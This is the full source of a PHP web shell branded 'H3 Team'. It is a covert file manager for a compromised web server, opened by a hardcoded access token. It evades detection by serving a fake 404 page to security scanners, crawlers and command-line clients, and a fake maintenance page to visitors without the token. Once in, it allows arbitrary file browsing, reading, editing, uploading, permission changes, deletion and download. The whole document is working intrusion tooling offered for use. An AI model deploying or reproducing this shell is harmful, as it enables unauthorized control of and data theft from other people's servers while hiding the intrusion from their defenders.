<?php
// H3 TEAM | No Drama. No Spotlight. Just HHH.
error_reporting(0);

$auth_token = 'h3team';
$allowed_ua = ['Mozilla', 'Chrome', 'Safari'];

$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$token = $_GET['access'] ?? '';

$blocked_ua = ['bot', 'spider', 'crawl', 'scanner', 'imunify', 'modsec', 'litespeed', 'python', 'curl', 'wget'];
foreach ($blocked_ua as $bad) {
  if (strpos($ua, $bad) !== false || trim($ua) === '') {
    http_response_code(404);
    die('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1></body></html>');
  }
}

if (!in_array(true, array_map(fn($a) => strpos($ua, strtolower($a)) !== false, $allowed_ua)) || $token !== $auth_token) {
  http_response_code(403);
  die('<!DOCTYPE html><html><head><title>Offline</title></head><body><h1>🚧 Maintenance</h1></body></html>');
}

$cwd = getcwd();
$path = urldecode($_GET['path'] ?? '.');
$isFile = is_file($path);
$isDir = is_dir($path);

// ACTIONS
if (isset($_POST['save'], $_POST['filename'])) {
  file_put_contents($_POST['filename'], $_POST['content']);
  echo "<div class='bg-green-600 text-white p-2 rounded mb-2'>✅ Updated</div>";
}
if (isset($_POST['upload']) && isset($_FILES['up'])) {
  $target = $cwd . '/' . basename($_FILES['up']['name']);
  if (move_uploaded_file($_FILES['up']['tmp_name'], $target)) {
    echo "<div class='bg-green-600 text-white p-2 rounded mb-2'>✅ File added</div>";
  } else {
    echo "<div class='bg-red-600 text-white p-2 rounded mb-2'>❌ Failed</div>";
  }
}
if (isset($_POST['mkdir']) && !empty($_POST['foldername'])) {
  $newDir = rtrim($path, '/') . '/' . basename($_POST['foldername']);
  if (mkdir($newDir)) {
    echo "<div class='bg-green-600 text-white p-2 rounded mb-2'>📁 Folder created</div>";
  }
}
if (isset($_POST['chmod'], $_POST['target'], $_POST['perm'])) {
  @chmod($_POST['target'], octdec($_POST['perm']));
}
if (isset($_GET['delete'])) {
  $target = $_GET['delete'];
  if (is_file($target)) unlink($target);
  elseif (is_dir($target)) rmdir($target);
}
if (isset($_GET['download'])) {
  $file = $_GET['download'];
  if (is_file($file)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
  }
}
?>
<!DOCTYPE html>
<html lang="en" class="bg-black text-white">
<head>
  <meta charset="UTF-8">
  <title>H3 Control</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="p-6 font-mono text-sm">
<div class="max-w-6xl mx-auto">
  <h1 class="text-5xl font-bold text-red-600 mb-2 text-center">H3 Team</h1>
  <p class="text-zinc-400 mb-6 text-center">No Drama. No Spotlight. Just <span class="text-white font-bold">HHH</span>.</p>

  <nav class="text-sm text-zinc-400 mb-4">
    <?php
      $absolutePath = realpath($path);
      $parts = explode(DIRECTORY_SEPARATOR, $absolutePath);
      $build = '';
      foreach ($parts as $index => $part) {
        if ($part === '') continue;
        $build .= DIRECTORY_SEPARATOR . $part;
        echo ($index > 0 ? ' / ' : '') . '<a href="?access=' . $auth_token . '&path=' . urlencode($build) . '" class="text-fuchsia-400 hover:underline">' . $part . '</a>';
      }
    ?>
  </nav>

  <div class="flex flex-wrap gap-4 items-center mb-6">
    <form method="post" enctype="multipart/form-data" class="flex gap-2">
      <input type="file" name="up" class="bg-zinc-800 rounded p-1">
      <button name="upload" class="bg-red-700 hover:bg-red-800 px-3 py-1 rounded">📤 Upload</button>
    </form>
    <form method="post" class="flex gap-2">
      <input type="text" name="foldername" placeholder="folder name" class="bg-zinc-800 rounded px-2">
      <button name="mkdir" class="bg-blue-700 hover:bg-blue-800 px-3 py-1 rounded">📁 Create Folder</button>
    </form>
  </div>

  <?php if ($isDir): ?>
  <div class="overflow-x-auto">
    <table class="w-full table-auto border border-zinc-800">
      <thead class="bg-zinc-900 text-xs text-zinc-400">
        <tr>
          <th class="p-3 text-left">Name</th>
          <th class="p-3">Type</th>
          <th class="p-3">Size</th>
          <th class="p-3">CHMOD</th>
          <th class="p-3">Actions</th>
        </tr>
      </thead>
      <tbody>
        <?php
        function readable_size($bytes) {
          $sizes = ['B','KB','MB','GB','TB'];
          $i = $bytes > 0 ? floor(log($bytes, 1024)) : 0;
          return round($bytes / pow(1024, $i), 2) . ' ' . $sizes[$i];
        }
        function get_chmod($file) {
          return substr(sprintf('%o', fileperms($file)), -4);
        }
        $all = array_filter(scandir($path), fn($f) => $f !== '.');
        $dirs = [];
        $files = [];
        foreach ($all as $f) {
          $fp = rtrim($path, '/') . '/' . $f;
          if (is_dir($fp)) $dirs[] = $f;
          else $files[] = $f;
        }
        $list = array_merge($dirs, $files);
        foreach ($list as $f):
          $fp = rtrim($path, '/') . '/' . $f;
          $isF = is_file($fp);
        ?>
        <tr class="border-t border-zinc-800 hover:bg-zinc-900">
          <td class="p-3 break-all">
            <a href="?access=<?= $auth_token ?>&path=<?= urlencode($fp) ?>" class="<?= is_dir($fp) ? 'text-yellow-400' : '' ?> hover:underline">
              <?= is_dir($fp) ? '📁' : '📄' ?> <?= htmlspecialchars($f) ?>
            </a>
          </td>
          <td class="p-3 text-center text-zinc-400"><?= is_dir($fp) ? 'Folder' : 'File' ?></td>
          <td class="p-3 text-center"><?= is_file($fp) ? readable_size(@filesize($fp)) : '-' ?></td>
          <td class="p-3 text-center">
            <form method="post" class="inline-flex items-center gap-1">
              <input type="hidden" name="target" value="<?= $fp ?>">
              <input type="text" name="perm" value="<?= get_chmod($fp) ?>" class="w-14 bg-zinc-800 text-center text-white text-xs px-1 rounded">
              <button name="chmod" class="text-fuchsia-400 text-sm">✔</button>
            </form>
          </td>
          <td class="p-3 text-center whitespace-nowrap">
            <a href="?access=<?= $auth_token ?>&path=<?= urlencode($fp) ?>" class="text-green-400 text-sm mr-2">✏️</a>
            <?php if ($isF): ?>
              <a href="?access=<?= $auth_token ?>&download=<?= urlencode($fp) ?>" class="text-blue-400 text-sm mr-2">⬇️</a>
            <?php endif; ?>
            <a href="?access=<?= $auth_token ?>&delete=<?= urlencode($fp) ?>" class="text-red-500 text-sm">🗑️</a>
          </td>
        </tr>
        <?php endforeach; ?>
      </tbody>
    </table>
  </div>
  <?php endif; ?>

  <?php if ($isFile && is_readable($path)): ?>
  <form method="post" class="mt-10">
    <input type="hidden" name="filename" value="<?= htmlspecialchars($path) ?>">
    <label class="block text-zinc-400 mb-2">Editing: <span class="text-white font-bold"><?= basename($path) ?></span></label>
    <textarea name="content" rows="25" class="w-full bg-black text-green-300 font-mono border border-zinc-700 rounded p-3 mb-3"><?= htmlspecialchars(file_get_contents($path)) ?></textarea>
    <button name="save" class="bg-green-600 hover:bg-green-700 px-5 py-2 rounded text-sm font-semibold">💾 Save</button>
  </form>
  <?php endif; ?>

  <footer class="text-center text-zinc-500 text-xs mt-12 border-t border-zinc-700 pt-4">
    <p>&copy; <?= date('Y') ?> <span class="text-white font-semibold">H3 Team</span>. No Drama. No Spotlight. Just <span class="text-red-600 font-bold">HHH</span>.</p>
  </footer>
</div>
</body>
</html>
